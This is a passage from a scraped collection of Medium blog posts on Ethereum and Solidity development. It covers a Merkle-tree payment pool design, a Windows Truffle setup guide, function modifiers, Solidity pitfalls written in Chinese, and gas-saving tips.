hashed leaf node to the proof (which is the hex representation of the hashes that make up the proof). If the hash of the sum of the hashed leaf node and the provided proof equal the Merkle root that was submitted by the contract owner, then the paymentPool.withdraw() function can permit the token transfer from the payment pool to the msg.sender.Additionally, we\u2019ll need to keep track of the withdrawals for each of the payees, so that the msg.sender cannot issue duplicate paymentPool.withdraw() function calls.So\u2014this approach is a good start. We have unlocked the ability to pay as many payees as we want from the payment pool without having to incur massive gas fees, and moreover, it means we can decouple our gas fee used to specify the payees from the amount of payees that can withdraw from the payment pool. The payee\u2019s proof basically acts like a key that only works for transactions initiated from each payee\u2019s address that can be used to unlock that payee\u2019s tokens from the pool.But we still have a few challenges.What if the payee wants to only withdraw a partial amount of the tokens that are due to them?How can we represent the amount of tokens that are available for the address/proof pair on-chain?What about multiple payment cycles? Can we use old proofs when the Merkle root is updated?Making It Even BetterTo address the challenges mentioned above, we added metadata into the proof for each payee, and we introduced the idea of \u201cpayment cycles\u201d to the payment pool.Payment CyclesWithin the payment pool smart contract we keep track of the payment cycle delineated by the submission of each Merkle root. The submission of a Merkle root to the payment pool by the contract owner signifies the end of the current payment cycle, and a new payment cycle begins.Within the payment pool smart contract we maintain a mapping property that maps the payment cycle number to the Merkle root that governs that payment pool for that payment cycle. This way, when the paymentPool.withdraw() function is called with a proof, if we know the payment cycle the proof was generated against, we can validate the proof against the correct Merkle root.This allows payees to use old proofs to claim their payments. It does mean, however, that a proof is tied to a particular amount of tokens. You cannot claim more tokens than the amount of tokens used in the generation of the leaf node\u2019s hash for the proof that is supplied.As long as the payment pool is keeping track of how many tokens have been withdrawn for each payee, we can make sure to deduct from the cumulative amount of tokens that are allocated to the payee, the amount of tokens that they have already withdrawn to arrive at the amount of tokens available for a given proof/address pair.Proof MetadataAnother challenge to overcome is how to withdraw a token amount that is less than the amount of tokens used to create the proof. Additionally, how can we make it easier for the user to associate the proof to a particular payment cycle, so that the correct Merkle root can be used to validate the withdrawal request?For these challenges we have introduced the idea of attaching metadata to the proof itself. What this means is that we can incorporate into the proof both the payment cycle number and the cumulative amount of tokens owed to the payee that was used to generate the payee\u2019s payment leaf node in the Merkle tree. As a result, the payee invokes the paymentPool.withdraw() function with an amount up to, but not exceeding the amount of tokens available for the proof, as well as the proof itself.Simple, right? The payee is calling paymentPool.withdraw() with the number of tokens they want and a special key that works just for them to unlock those tokens from the payment pool.So here\u2019s how that works: as I mentioned above, the proof is really just an array of the great-aunt & uncle hashes that has been serialized into a hexadecimal format. To include metadata in the proof, what we do is simply add a couple extra items to that proof array as part of the code library that we use to retrieve a proof for a node in the Merkle tree.Specifically, we are adding the payment cycle number that corresponds to the Merkle root (we can get that by calling paymentPool.numPaymentCycles() on the paymentPool smart contract before the Merkle root is submitted to the contract) and we are adding the cumulative amount of tokens the payee is allowed to withdraw. Within the paymentPool.withdraw() function what we do is we strip the metadata off of the proof so that the paymentPool.withdraw() function knows the payment cycle the proof pertains to, as well as the amount of tokens that is part of the leaf node in the Merkle tree for this payee.This allows the paymentPool.withdraw() function to look up the correct Merkle root for the proof, as well as to construct the leaf node hash for the payment correctly by using the msg.sender and the amount of tokens that appeared within the proof metadata. Now the amount that appears in the paymentPool.withdraw(amount, proof) is the amount of tokens that the payee wishes to withdraw from the overall amount of tokens that the proof entitles the payee to receive.Figure: Cardstack\u2019s approach of payment pool via metadata-proof Merkle TreesThis approach also allows us to provide an on-chain function that anyone can use to see the amount of tokens that are available for any given proof provided that the requestor knows the address of the payee that goes along with the proof.Important ConsiderationsI\u2019ve mentioned a couple times in this solution that the Merkle tree needs to keep track of the cumulative amount of tokens, meaning that the list of payees and their amounts can only ever grow over time \u2014 we should not ever see that a payee\u2019s cumulative amount be less in a subsequent payment cycle.Why is that? This is a nuance of this particular approach: the Merkle trees we build for each payment cycle need to reflect the cumulative payment amounts for the payees, and a mapping of payment withdrawals should be maintained in the payment pool, the difference of which is the amount that the payee can be allowed to withdraw for any valid proof that they provide (and obviously not permitting a withdrawal when the difference is negative).If the cumulative payment amounts in subsequent payment cycles actually decreased, that means math to calculate the amount of tokens available for the proof, the difference between the amount already withdrawn and the cumulative total in the proof\u2019s metadata will be incorrect, and negatively penalize available balance of subsequent proofs for the payee, such that they wont be able to withdraw all of their tokens.This solution is heavily reliant on off-chain techniques \u2014 specifically, posting the payee\u2019s proofs in a place that they can be easily discovered (IPFS is probably the most obvious place). Likely you\u2019ll want to also post the amount of tokens that the payee received for the payment cycle, and perhaps even provide links to a dApp that can display the balance available for the proof in the payment pool.Additionally it is worth noting that in this solution (and all the solutions mentioned in this post) do not address how to make sure that the payment pool is fully funded so that the withdrawals made by the payees can continue un-impeded. In the code samples we provide, we do ensure that the payment pool has enough funds before attempting to perform a transfer of tokens to the payee when they invoke the paymentPool.withdraw() function. One conceivable approach here would be to emit payment pool token balance warning events when the payment pool balance drops below a particular threshold.What\u2019s NextFeel tree to play with this solution, improve it, and use it in your own contracts. You can find the code (both the contracts and the javascript library that we use to build the proof and the metadata) in our GitHub repo. The README file and tests included in the repo demonstrate at a code level how to leverage this approach. We\u2019d love to hear your thoughts on this approach.Moving forward, we at Cardstack plan to use this approach as a means to facilitate payments for our exciting new Tally Protocol. One of the main themes around the Tally Protocol is building an approach to scale the blockchain. Leveraging a Merkle tree based payment pool is a big part of that overall approach. Although, we have even bigger ideas around how we can scale the blockchain embedded at the heart of the Tally Protocol. Stay tuned for more!Read MoreHow to Get One Billion Users on Blockchain by Chris TseGrowing a Healthy Software Ecosystem by Lead Developer Ed FaulknerBuilding on Blockchain the Right WayThe Cardstack White PaperJoin our communityTo learn more about Cardstack, visit https://cardstack.com.Join the Cardstack community channel on Telegram at https://t.me/cardstackHassan (@habdelra) has been designing and building a system for digital scarcity and digital rights on the bitcoin blockchain since 2014. He has been working on open-source Cardstack codebase since 2015 focusing on bringing external data sources into the Cardstack framework. Hassan is leading the design and architecture efforts in Solidity for Cardstack, and is an expert on the trade-offs of on-chain and off-chain computation and storage. Hassan has a Bachelor\u2019s degree in Computer Science and Mathematics from the Colorado School of Mines.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Tech"]}, {"title": "Getting started with Ethereum & Solidity on Windows \u2014 part 1", "post_link": "https://medium.com/@wslyvh/get-started-with-ethereum-solidity-on-windows-1672e9953a1?source=search_post", "author_name": "Wesley van Heije", "author_link": "https://medium.com/@wslyvh", "publish_date": "2017-10-02", "last_modified_date": "2018-06-17", "readtime": "2.91", "claps": 362, "voters": 49, "content": "Getting started with Ethereum & Solidity on Windows \u2014 part 1Wesley van HeijeFollowOct 2, 2017 \u00b7 3 min readGetting started with Ethereum & Solidity development on Windows can be somewhat daunting as most tools are designed for linux. Coming from a Microsoft background I do prefer some of my familiar tools to avoid the additional hurdles. After playing around for a bit, it\u2019s actually quite easy to get started. So let me guide you setting-up your Windows environment and get yourself ready for developing your first smart contract on Ethereum.The tools we\u2019re going use for it are;Visual Studio CodeNode.jsGitDefault installation for these will do just fine, but at least make sure that (Node and Git) are added to the PATH variables on your system.Now that we\u2019ve got our basics, let\u2019s continue installing the rest of our tools via Node.js (which we\u2019ve just installed). Open up a PowerShell window, with administrative access, to execute the following commands.npm install -g npmnpm install -g windows-build-toolsnpm install -g ethereumjs-testrpc truffleThe windows-build-tools are required to compile native Node modules. And the combination of ethereumjs-testrpc together with the truffle framework, will basically give you everything you need to start developing right away. We\u2019ll follow up on those later on.*Make sure you\u2019ve got everything installed correctly.If everything is OK, we can now continue to Visual Studio Code and install one more extension for Solidity. You can either search for it in the Extension marketplace or directly from the terminal;code --install-extension juanblanco.solidity*Don\u2019t forget to reload your window after installation.So now it\u2019s time to get our first project up and running. Create a new folder \u2018truffledemo\u2019 or mkdir truffledemo and open it up with VS Code. From your integrated terminal we\u2019ll start off with initializing the default project truffle is providing us, to test and show our environment is running correctly.truffle initEDIT: Since truffle v4 init will give you a clean, empty truffle solution. For installing the MetaCoin project you need the following command.truffle unbox metacoinOnce completed, you\u2019ll have a default project structure containing a set of example Solidity contracts, which act as an alt-coin on Ethereum. More info can be found at the truffle docs.*Default Truffle project structure.We\u2019ll leave these as they are right now and open up a new PowerShell window. You can do so from within the integrated terminal as well, but I\u2019d like to leave it running in the background without interfering within VS Code. Execute the command testrpc which will start your Ethereum client. It simulates all client behavior making testing and development so much easier and faster.*Note that TestRPC is a simulated client for development and testing and not connected to an actual chain.As you can see right now is that testrpc is listening on localhost:8545 and will act as your locally running Ethereum Node. Meaning that if we go back to VS Code (leaving testrpc running) we can now test our contracts, from the terminal again..truffle testWhich will compile our solidity contracts and will execute the tests, which are part of the default project.*Testing our default Truffle project.That\u2019s it! You can now start developing and testing your smart contracts and play around with it for a bit. We\u2019ll dive into more details on all the tools and details in future posts. If you want to know anything specific, feel free to post below.UPDATE: If you\u2019re up for it; feel free to continue to part 2.", "responses": 7, "tags": ["Solidity", "Ethereum", "Blockchain", "Visual Studio", "Software Development"]}, {"title": "How to write clean, elegant Solidity code using function modifiers", "post_link": "https://medium.com/colony/how-to-write-clean-elegant-solidity-code-using-function-modifiers-ba55fb366a92?source=search_post", "author_name": "Thiago Delgado", "author_link": "https://medium.com/@thiagodelgado", "publish_date": "2017-09-12", "last_modified_date": "2018-06-10", "readtime": "1.89", "claps": 333, "voters": 48, "content": "How to write clean, elegant Solidity code using function modifiersThiago DelgadoFollowSep 12, 2017 \u00b7 2 min readOne of the most interesting features in Solidity are function modifiers. When added to a function body they extend it, allowing us to abstract parts of our code and write functions with fewer conditionals checks intertwined with state changes.Creating a function modifierThe syntax looks similar to declaring a function, except it uses the modifier keyword. The underscore on indicates how the original function is changed:modifier assertValueIsOne(uint value) {  assert(value == 1);  _; // original function goes at this point}function doSomething(uint value)  assertValueIsOne(value){}Use casesChecking for invariants or conditions using require, revert (throw is deprecated, see more here) or assert accordingly:// For parameterless modifiers, we can omit parenthesismodifier isAllowed {   assert(msg.sender == owner); // contract state  _;}modifier isValidAddress(address target) {  require(target != 0x0);  _;}modifier isValueBiggerThanZero(uint value) {  require(value > 0);  _;}function isOwner(address target) constant returns (bool) {  return target == owner;}function simpleFunction(address target)  isValidAddress(target)  isValueBiggerThanZero(msg.value)  isAllowed // omitted parenthesis for parameterless modifiers  payable{    // do something}Please note that modifiers are applied to the original function in the order they are presented on the function declaration, i.e: isValidAddress, isValueBiggerThanZero, isAllowed and then payable.Checking for msg.sender permissions:modifier isOwner {  assert(owner == msg.sender);  _;}function finalize() isOwner {  finalized = true;}Raising events before or after a function is called:event StartEvent();event FinishEvent();modifier logEvents {  StartEvent();  _;  FinishEvent();}function toggle () logEvents {}ConclusionBefore formal verification or code coverage, clean code should be the first line of defense. Otherwise, logical flaws and vulnerabilities will have far more places to hide and go unnoticed to the eyes of a reviewer.It might take a few iterations to achieve and using modifiers won\u2019t magically make your code legible. But when used with care, they become a powerful tool to tame complexity and leverage reusability, making your code cleaner and safer.Join Colony\u2019s mailing list \u2014 we don't spam, I promise! \u2014 to stay up to date with conversations on the future of work and organizations.About the authorThiago Delgado is a software developer who loves Solidity, JavaScript, and open-source. Based at S\u00e3o Paulo, Brazil.Fell in love at first sight with Colony and Ethereum, since then, left his cubicle behind and never looked back.", "responses": 0, "tags": ["Ethereum", "Solidity"]}, {"title": "Solidity\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u8207\u6ce8\u610f\u4e8b\u9805(\u4e00)", "post_link": "https://medium.com/taipei-ethereum-meetup/solidity%E6%92%B0%E5%AF%AB%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E8%88%87%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85-%E4%B8%80-6c9eacc00168?source=search_post", "author_name": "NIC Lin", "author_link": "https://medium.com/@twedusuck", "publish_date": "2017-01-10", "last_modified_date": "2018-06-09", "readtime": "6.8", "claps": 226, "voters": 46, "content": "Solidity\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u8207\u6ce8\u610f\u4e8b\u9805(\u4e00)NIC LinFollowJan 10, 2017 \u00b7 7 min read\u4ecb\u7d39\u7528Solidity\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u7684\u6ce8\u610f\u4e8b\u9805\u53caevent\u7684\u4f7f\u7528Solidity\u7684\u57fa\u790e\u56e0\u70ba\u5df2\u7d93\u505a\u904e\u6295\u5f71\u7247\uff0c\u6240\u4ee5\u4e0d\u518d\u591a\u505a\u4ecb\u7d39\uff0c\u4e4b\u5f8c\u6709\u6a5f\u6703\u53ef\u80fd\u6703\u518d\u6539\u6210\u6587\u7ae0\u7684\u5f62\u5f0f\u3002\u9019\u908a\u6703\u505a\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9805\u7684\u6574\u7406\u53ca\u4ecb\u7d39event\u7684\u4f7f\u7528\u3002\u578b\u614b\uff1aarray\uff1a1. [updated 2017/2/23]\u52d5\u614barray\u53ef\u4ee5\u52d5\u614b\u5730\u6539\u8b8a\u9577\u5ea6\uff0c\u5982 array1.length = 20 \uff0c\u4f46\u5982\u679c\u662f\u5ba3\u544a\u6210memory\uff0c\u5982 int[] memory x \u6216\u662f\u7531\u51fd\u5f0f\u7684\u53c3\u6578\u50b3\u5165\u7684\u9663\u5217\u5247\u7121\u6cd5\u6539\u8b8a\uff0c\u5982 function passArray(int[] y){}int[] x;x.length = 30;        //errorfunction passArray(int[] y){    y.length = 15;    //error}2.\u9663\u5217\u7dad\u5ea6\u7684\u5ba3\u544a\u662f\u53cd\u904e\u4f86\u7684\uff0c\u4f8b\u5982 int[8][5] \u4ee3\u8868\u67095\u500b\u9577\u5ea6\u70ba8\u7684\u9663\u5217\uff0c int[][3] \u4ee3\u8868\u67093\u500b\u52d5\u614b\u9577\u5ea6\u7684\u9663\u5217\u30023. [updated 2017/2/23]solidity\u7684\u52d5\u614b\u9663\u5217\u53ea\u80fd\u5c0d\u7576\u4e0b\u9663\u5217\u5b58\u5728\u7684\u503c\u505a\u4fee\u6539\uff0c\u5982\u679c\u4f60\u7684\u52d5\u614b\u9663\u5217\u7576\u524d\u9577\u5ea6\u70ba3\uff0c\u5247\u4f60\u76f4\u63a5\u8ce6\u503c\u7d66\u7b2c3\uff08\u6216\u4ee5\u4e0a\uff09\u500b\u4f4d\u7f6e\u6642\u6703\u51fa\u73feerror\u3002\u4f8b\u5982\uff1aint[] dyn;dyn.push('first');         //dyn[0]dyn.push('second');        //dyn[1]dyn.push('third');         //dyn[2]dyn[2] = 'change third';   //modify third and existing elementdyn[3] = 'fourth';         //assign fourth but non-existing element \u2014> raise error: invalid JUMPdyn.push('fourth');        //need to use 'push' method to make it into existence//if it's a static array, you can simply assign the valueint[5] stc;stc[3] = 'fourth';double/float\uff1aSolidity\u76ee\u524d\u6c92\u6709\u652f\u63f4double/float\uff0c\u5982\u679c\u662f 7/2 \u6703\u5f97\u52303\uff0c\u5373\u7121\u689d\u4ef6\u6368\u53bb\u3002string\uff1a\u4e0d\u50cfarray\uff0cstring\u6c92\u6709length\u4e5f\u4e0d\u80fd\u7528index\u4f86\u8b80\u53d6\u67d0\u500b\u4f4d\u7f6e\u7684\u5b57\uff0c\u5982\u4e0bstring s = 'a string';s[3];      //compile errors.length;  //compile error\u5982\u679c\u8981\u5c0dstring\u9032\u884c\u4fee\u6539\uff0c\u8981\u5148\u8f49\u63db\u6210bytes\uff0c\u5982 bytes(s) \u5373\u53ef\u5c0d\u7279\u5b9a\u4f4d\u7f6e\u505a\u64cd\u4f5c bytes(s)[3]= 'p'; \u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\u6709\u4e9b\u5b57\u5143(ASCII\u5b57\u5143\u4e4b\u5916\u7684)\u53ef\u80fd\u6703\u5927\u65bc1\u500bbyte\uff0c\u6240\u4ee5\u7576\u4f60\u5c07string\u8f49\u63db\u6210bytes\u5f8c\uff0c\u5c0d\u67d0\u4e00\u500b\u5b57\u5143\u505a\u4fee\u6539(\u4ee5i\u70ba\u4f8b\u597d\u4e86)\uff0c\u4f46\u662f\u7b2ci\u500b\u5b57\u5143\u662f\u7531i\u548ci+1 byte\u6240\u7d44\u6210\uff0c\u6240\u4ee5 bytes(s)[i] = x \u53ea\u6703\u4fee\u6539\u7b2ci\u500bbyte\u800c\u4e0d\u662f\u4f60\u9810\u671f\u7684\u7b2ci\u500b\u5b57\u5143\u3002struct\uff1a1.struct\u53ef\u4ee5\u8907\u88fd\uff0c\u4f46\u5982\u679cstruct\u88e1\u9762\u6709mapping\uff0c\u5247mapping\u7684\u90e8\u5206\u7121\u6cd5\u8907\u88fd\uff0c\u4f8b\u5982struct user {    mapping(string => string) secrets;}function somefunction {   user user1;   user1.secrets[\"Run\"] = \"Hide\";   user user2 = user1;}user2.secret[\u201cRun\u201d]\u6703\u56de\u50b3\u7a7a\u5b57\u4e32\u30022.\u53ea\u6709internal function\u53ef\u4ee5\u56de\u50b3struct\u578b\u614bfunction inter() internal returns(user) {}enum\uff1aenum\u8b93\u4f7f\u7528\u8005\u53ef\u4ee5\u81ea\u5b9a\u7fa9\u8b8a\u6578\u800c\u4e0d\u9700\u8981\u6307\u5b9a\u578b\u614b\u3002enum myMove{ Up, Left, Down, Right}enum\u88e1\u9762\u7684\u503c\u4f9d\u7167\u5ba3\u544a\u7684\u9806\u5e8f\u5f9e\u96f6\u958b\u59cb\u905e\u589e\uff0c\u53ef\u4ee5\u8f49\u63db\u6210\u6b63\u6574\u6578(uint)uint(myMove.Up);      //0uint(myMove.Left);    //1\u53ef\u4ee5\u5229\u7528enum\u4f86\u6a21\u64ec\u5408\u7d04\u72c0\u614b\u8f49\u63db\uff1aenum State { Created, Locked, Inactive }State public state;                 //default is 0 which is Createdmodifier inState(State _state) {        if (state != _state) throw;        _;}\u4e4b\u5f8c\u7684\u51fd\u5f0f\u4fbf\u53ef\u5229\u7528inState\u9019\u500bmodifier\u4f86\u6aa2\u67e5\u76ee\u524dstage\u662f\u5426\u7b26\u5408\uff1afunction confirmPurchase() inState(State.Created) payable {        purchaseConfirmed();        buyer = msg.sender;        state = State.Locked;}\u5982\u6b64\u4fbf\u9650\u5236confirmPurchase\u51fd\u5f0f\u53ea\u80fd\u5728state\u70baCreated\u7684\u624d\u80fd\u57f7\u884c\u3002memory/storage\uff1a1.\u50b3\u5165\u51fd\u5f0f\u7684\u53c3\u6578\u90fd\u662f\u8907\u88fd\u4e00\u4efd\u5728memory\u4e2d\uff0c\u6240\u4ee5\u5982\u679c\u5c0d\u50b3\u5165\u7684\u53c3\u6578\u505a\u4fee\u6539\uff0c\u6700\u5f8c\u4e26\u4e0d\u6703\u5f71\u97ff\u539f\u672c\u7684\u503c\uff0c\u5982\u4e0buint[] x = [1, 2, 3];function modifyX(uint[] _x){    _x[0] = 0;}modifyX(x);          //x is still [1, 2, 3]\u5982\u679c\u8981\u6539\u8b8a\u539f\u672c\u7684\u503c(pass by reference)\uff0c\u5728\u51fd\u5f0f\u7684\u53c3\u6578\u5ba3\u544a\u52a0\u4e00\u500bstorageuint[] x = [1, 2, 3];function modifyX(uint[] storage _x){    _x[0] = 0;}modifyX(x);         //x becomes [0, 2, 3]\u4e0d\u904e\u7d93\u904eCompiler\u66f4\u65b0\u5f8c\uff0c\u9019\u6a23\u7684function\u53ea\u80fd\u662finternal\u6216\u662fprivate\u7684\uff1auint[] x = [1, 2, 3];function modifyX(uint[] storage _x) internal {    _x[0] = 0;}2.var\u8b8a\u6578\u7684\u578b\u614b\u6703\u5728\u7b2c\u4e00\u6b21\u8ce6\u503c\u7684\u6642\u5019\uff0c\u8f49\u8b8a\u70ba\u8ce6\u503c\u4f86\u6e90\u7684\u578b\u614buint8 x = 10;var y;y = x;    //y is now of type uint8\u5728for loop\u88e1\u76e1\u91cf\u5ba3\u544a\u660e\u78ba\u7684\u578b\u614b\uff0c\u4e0d\u8981\u7528var\uff0c\u4ee5\u4e0b\u4f8b\u5b50\u6703\u5c0e\u81f4\u7121\u7aae\u8ff4\u5708for(var i=0; i<2000; i++){    someArray[i] = i;}\u56e0\u70ba\u5728i=0\u7684\u90a3\u4e00\u523b\u5373\u5ba3\u544a\u5b83\u70bauint8\u578b\u614b\uff0c\u6240\u4ee5\u5b83\u5927\u5c0f\u4e0a\u9650\u53ea\u67092**8 = 256\uff0c\u9020\u6210i\u6c38\u9060\u5230\u4e0d\u4e862000\u30023.local variable\u4e5f\u6703\u662f\u4ee5storage\u5f62\u5f0f\u5132\u5b58\uff0c\u4f46\u5982\u679c\u6c92\u6709\u8ce6\u503c\u7d66local variable\u800c\u76f4\u63a5\u4f7f\u7528\u6703\u9020\u6210\u4e00\u4e9b\u975e\u9810\u671f\u7684\u884c\u70ba\uff0ccontract C {    uint firstVariable;    uint[] data;    function f() {        uint[] x;        x.push(2);        data = x;    }}\u9019\u88e1\u7684x\u6703\u88ab\u7576\u6210\u503c\u70ba\u96f6\u7684\u9663\u5217\u6307\u6a19\uff0c\u6240\u4ee5x.push(2)\u6703\u9020\u6210\u7b2c\u96f6\u500bstate variable(\u4e5f\u5c31\u662ffirstVariable)\u88ab\u4fee\u6539\uff0c\u9023\u5e36\u5f8c\u9762\u7684\u8b8a\u6578\u90fd\u53d7\u5f71\u97ff\u3002\u9019\u500b\u4f8b\u5b50\u61c9\u8a72\u6539\u6210\uff1acontract C {    uint firstVariable;    uint[] data;    function f() {        uint[] x = data;        x.push(2);    }}\u5408\u7d04\uff1a1.\u5728Solidity0.4.0\u4e4b\u5f8c\uff0c\u8a2d\u5b9a\u6703\u9700\u8981\u6536ether\u7684\u51fd\u5f0f\u90fd\u8981\u52a0\u4e00\u500bpayable\u5c6c\u6027\uff0c\u5982\u679c\u6c92\u52a0\u800c\u6709\u4eba\u547c\u53eb\u8a72\u51fd\u5f0f\u9806\u4fbf\u5e36ether\u7684\u8a71\u5c31\u6703\u9020\u6210error\u3002\u540c\u6a23\u7684\uff0cfallback\u51fd\u5f0f\u4e5f\u8981\u6c7a\u5b9a\u662f\u5426\u52a0payable\uff0c\u5982\u679c\u4f60\u958b\u653e\u5176\u4ed6\u4eba\u76f4\u63a5\u8f49\u9322\u9032\u4f60\u7684\u5408\u7d04(\u6703\u89f8\u767cfallback\u51fd\u5f0f)\uff0c\u90a3\u5c31\u8981\u52a0function () payable{    moneyReceived = msg.value;}2.\u5982\u679c\u5728\u5408\u7d04\u5167\u5275\u5efa\u65b0\u5408\u7d04\uff0c\u4f46\u662f\u5728\u5efa\u7acb\u6642\u53c8\u8981\u5e36ether\u9032\u53bb\u7684\u8a71\u8981\u600e\u9ebc\u505a\uff1fcontract C {    function C() payable {}}contract B {    address c;    function createC() {        c = (new C).value(10000000000)();    }}3.selfdestruct\u96d6\u7136\u53ef\u4ee5\u92b7\u6bc0\u5408\u7d04\u3001\u6e05\u7406\u5132\u5b58\u7a7a\u9593\uff0c\u4f46\u4e5f\u6709\u7f3a\u9ede\uff1a\u5982\u679c\u50b3ether\u7d66\u92b7\u6bc0\u5f8c\u7684\u5408\u7d04\uff0cether\u662f\u62ff\u4e0d\u56de\u4f86\u7684\u3002\u53ef\u4ee5\u7684\u8a71\u5c31\u6307\u5b9a\u4e00\u500b\u8b8a\u6578\u4f86\u4ee3\u8868\u5408\u7d04\u662f\u5426\u53ef\u4f7f\u7528\uff0c\u5408\u7d04\u88e1\u7684\u51fd\u5f0f\u57f7\u884c\u524d\u5148\u6aa2\u67e5\u8a72\u8b8a\u6578\u7684\u503c\u518d\u6c7a\u5b9a\u8981\u4e0d\u8981\u57f7\u884c\u3002\u4e0b\u7bc7\u6703\u4ecb\u7d39event\u7684\u4f7f\u7528", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity"]}, {"title": "Solidity tips and tricks to save gas and reduce bytecode size", "post_link": "https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6?source=search_post", "author_name": "Mudit Gupta", "author_link": "https://blog.polymath.network/@MuditG", "publish_date": "2019-02-15", "last_modified_date": "2019-02-21", "readtime": "6.18", "claps": 776, "voters": 48, "content": "Solidity tips and tricks to save gas and reduce bytecode sizeMudit GuptaFollowFeb 15 \u00b7 7 min readSolidity is a special language with many little quirks. A lot of things behave differently in Solidity than most other languages as Solidity is created to work on the EVM with its limited feature set. I wrote a blog post with ten tips to save gas in Solidity a few months back and it got a great response. Since then, I have gathered more tips and tricks to share with you all. Here they are:Function modifiers can be inefficientWhen you add a function modifier, the code of that function is picked up and put in the function modifier in place of the _ symbol. This can also be understood as \u2018The function modifiers are inlined\u201d. In normal programming languages, inlining small code is more efficient without any real drawback but Solidity is no ordinary language. In Solidity, the maximum size of a contract is restricted to 24 KB by EIP 170. If the same code is inlined multiple times, it adds up in size and that size limit can be hit easily.Internal functions, on the other hand, are not inlined but called as separate functions. This means they are very slightly more expensive in run time but save a lot of redundant bytecode in deployment. Internal functions can also help avoid the dreaded \u201cStack too deep Error\u201d as variables created in an internal function don\u2019t share the same restricted stack with the original function, but the variables created in modifiers share the same stack limit.I managed to reduce the size of one of my contracts from 23.95 KB to 11.9 KB with this trick. You can see the simple magical commit here. Focus on the DataStore.sol contract.Booleans use 8 bits while you only need 1 bitUnder the hood of solidity, Booleans (bool) are uint8 which means they use 8 bits of storage. A Boolean can only have two values: True or False. This means that you can store a boolean in only a single bit. You can pack 256 booleans in a single word. The easiest way is to take a uint256 variable and use all 256 bits of it to represent individual booleans. To get an individual boolean from a uint256 , use this function:function getBoolean(uint256 _packedBools, uint256 _boolNumber)    public view returns(bool){    uint256 flag = (_packedBools >> _boolNumber) & uint256(1);    return (flag == 1 ? true : false);}To set or clear a bool, use:function setBoolean(    uint256 _packedBools,    uint256 _boolNumber,    bool _value) public view returns(uint256) {    if (_value)        return _packedBools | uint256(1) << _boolNumber;    else        return _packedBools & ~(uint256(1) << _boolNumber);}With this technique, you can store 256 booleans in one storage slot. If you try to pack bool normally (like in a struct) then you will only be able to fit 32 bools in one slot. Use this only when you want to store more than 32 booleans.Use libraries to save some bytecodeWhen you call a public function of a library, the bytecode of that function is not made part of your contract so you can put complex logic in libraries while keeping the contract size small. Keep in mind that calling a library costs some gas and requires some bytecode as well. Calls to libraries are made through delegate call which means the libraries have access to the same data that the contract has and also the same permissions. This means that it\u2019s not worth doing for simple tasks. Another thing to remember is that solc inlines the internal functions of the library. Inlining has advantages of its own but it takes bytecode space.No need to initialize variables with default valuesIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). If you explicitly initialize it with its default value, you are just wasting gas.uint256 hello = 0; //bad, expensiveuint256 world; //good, cheapUse short reason stringsYou can (and should) attach error reason strings along with require statements to make it easier to understand why a contract call reverted. These strings, however, take space in the deployed bytecode. Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.require(balance >= amount, \"Insufficient balance\"); //goodrequire(balance >= amount, \"To whomsoever it may concern. I am writing this error message to let you know that the amount you are trying to transfer is unfortunately more than your current balance. Perhaps you made a typo or you are just trying to be a hacker boi. In any case, this transaction is going to revert. Please try again with a lower amount. Warm regards, EVM\"; //badAvoid repetitive checksThere is no need to check the same condition again and again in different forms. Most common redundant checks are due to SafeMath library. SafeMath library checks for underflows and overflows by itself so you don\u2019t need to check the variables yourself.require(balance >= amount); //This check is redundant because the safemath subtract function used below already includes this check.balance = balance.sub(amount);Make use of single line swapsSolidity offers a relatively uncommon feature that allows you to swap values of variables in a single statement. Use that instead of using a temporary variable/xor/arithmetic function to swap values. The following example shows how to swap values of different variables:(hello, world) = (world, hello)Use events to store data that is not required on-chainUsing events to store data is way cheaper than storing them in variables. You can\u2019t use data in events on-chain though. Also, work is being done on pruning old events so you might have to host your own nodes in the future to get data from old events. Exploiting events like this is kinda unethical but who am I to judge. I won\u2019t tell if you don\u2019t :).Make proper use of the optimizerApart from allowing you to turn optimizer on and off, solc allows you to customize optimizer runs. runs is not how many times the optimizer will run but how many times you expect to call functions in that smart contract. If the smart contract is only of one-time use as a smart contract for vesting or locking of tokens, you can set the runs value to 1 so that the compiler will produce the smallest possible bytecode but it may cost slightly more gas to call the function(s). If you are deploying a contract that will be used a lot (like an ERC20 token), you should set the runs to a high number like 1337 so that initial bytecode will be slightly larger but calls made to that contract will be cheaper. Commonly used functions like transfer will be cheaper.Using fewer functions can be helpfulUsually, it\u2019s good coding practice to use smaller singleton functions that have a single task. In solidity, using multiple smaller functions costs more gas and requires more bytecode. Using larger complex functions can make testing and auditing tough so I won\u2019t outright recommend using them but you can make use of them if you really want to squeeze the juice out of your contracts.Calling internal functions is cheaperFrom inside a smart contract, calling its internal functions is cheaper than calling its public functions, because when you call a public function, all the parameters are again copied into memory and passed to that function. By contrast, when you call an internal function, references of those parameters are passed and they are not copied into memory again. This saves a bit of gas, especially when the parameters are big.Using proxy patterns for mass deploymentIf you wish to deploy multiple copies of the same contract then consider deploying just one implementation contract and multiple proxy contracts that delegate their logic to the implementation contract. This will allow these contracts to share the same logic but different data.Final thoughtsMost of the general good programming principals and optimization apply to solidity as well but there are some oddities in Solidity like the few mentioned above that make it harder (but interesting) to optimize solidity code. You\u2019ll learn more tricks as you use solidity more and more. However, no matter how many tricks you use, you may still face the 24 KB code size limit when creating complex code. You can split your contracts into various contracts by using proxies or other tricks but the limit is still a pain. If you would like to see the limit removed, please provide your feedback on this GitHub Issue.If you know about any other trick or want to share a tip, feel free to drop a comment below. If you have any doubt or want help, you can drop a comment below as well or contact me personally. If you found this post interesting, share this with your friends and read my previous posts on my blog.Joining PolymathDo you want to join the security token revolution? We are growing rapidly and always looking for high quality talent. Check out our careers page at https://polymath.bamboohr.com/jobs/ to apply!About PolymathPolymath Network (Polymath) is a decentralized platform that makes it easy to create security tokens. The platform simplifies the complex technical challenges of creating a security token and aims to bring the multi-trillion dollar financial securities market to the blockchain. Learn more at 